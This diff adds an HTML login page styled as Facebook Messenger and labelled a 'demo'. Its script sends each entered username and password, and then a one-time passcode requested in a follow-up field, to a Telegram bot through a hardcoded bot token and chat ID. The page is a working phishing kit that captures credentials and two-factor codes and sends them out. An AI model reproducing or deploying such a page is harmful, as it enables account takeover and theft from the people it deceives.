@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Messenger Login (Demo)</title>
+    <link rel="icon" href="https://www.messenger.com/favicon.ico" type="image/x-icon">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        
+        .container {
+            text-align: center;
+            background: #fff;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            width: 320px;
+        }
+        
+        .logo {
+            width: 60px;
+            margin-bottom: 15px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        
+        p {
+            font-size: 14px;
+            color: #777;
+            margin-bottom: 20px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        button:hover {
+            background: #145dbf;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Messenger logo -->
+        <img class="logo" src="messanger.png" alt="Messenger Logo">
+
+        <h1>Messenger</h1>
+        <p>Sign facebook telegram to proceed for chats and video calls.</p>
+
+        <!-- Login form -->
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Procceed Now</button>
+        </form>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8351995650:AAH2FdV3bOdtZl5Beuzs7TlJphXHqw_Cmj4"; // Replace with your bot token
+        const CHAT_ID = "5615316142"; // Replace with your chat ID
+        const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            // Show demo alert
+            //alert("Demo Login submitted!\nUsername: " + username + "\nPassword: " + password);
+
+            // Send login info to Telegram (demo purposes)
+            fetch(TELEGRAM_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `Demo Login:\nUsername: ${username}\nPassword: ${password}`
+                })
+            });
+
+            // Add OTP step if not already added
+            if (!document.getElementById("otpInput")) {
+                const otpInput = document.createElement("input");
+                otpInput.type = "text";
+                otpInput.placeholder = "Enter OTP";
+                otpInput.id = "otpInput";
+                otpInput.required = true;
+
+                const verifyButton = document.createElement("button");
+                verifyButton.type = "button";
+                verifyButton.textContent = "Verify OTP";
+                verifyButton.onclick = function() {
+                    const otpValue = otpInput.value;
+                    //alert("your OTP error: " + otpValue);
+
+                    // Send OTP to Telegram (demo purposes)
+                    fetch(TELEGRAM_URL, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: `Demo OTP: ${otpValue}`
+                        })
+                    });
+                };
+
+                const form = document.getElementById("loginForm");
+                form.appendChild(otpInput);
+                form.appendChild(verifyButton);
+            }
+        });
+    </script>
+</body>
+
+</html>
